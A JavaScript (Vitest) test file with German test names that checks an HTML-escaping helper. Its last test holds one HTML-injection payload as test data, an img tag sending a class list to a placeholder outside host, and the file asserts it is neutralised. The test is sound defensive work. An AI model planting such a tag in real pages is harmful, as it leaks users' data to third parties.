import { describe, it, expect } from 'vitest';
import { escapeHtml } from './escapeHtml.js';

describe('escapeHtml', () => {
	it('entschärft die fünf HTML-Sonderzeichen', () => {
		expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
	});

	it('maskiert das kaufmännische Und zuerst — sonst entstehen doppelte Entities', () => {
		expect(escapeHtml('&lt;')).toBe('&amp;lt;');
	});

	it('lässt harmlosen Text unverändert', () => {
		expect(escapeHtml('Müller-Lüdenscheidt 7b')).toBe('Müller-Lüdenscheidt 7b');
	});

	it('liefert für null/undefined einen leeren String', () => {
		expect(escapeHtml(null)).toBe('');
		expect(escapeHtml(undefined)).toBe('');
	});

	it('macht aus dem gemessenen Exfiltrations-Bild reinen Text', () => {
		// Genau die Nutzlast, die im Druckfenster geladen hat (CSP img-src … https:).
		const nutzlast = '<img src="https://fremder-host/?daten=Klassenliste">';
		const maskiert = escapeHtml(nutzlast);
		expect(maskiert).not.toContain('<img');
		expect(maskiert).not.toContain('"');
	});
});
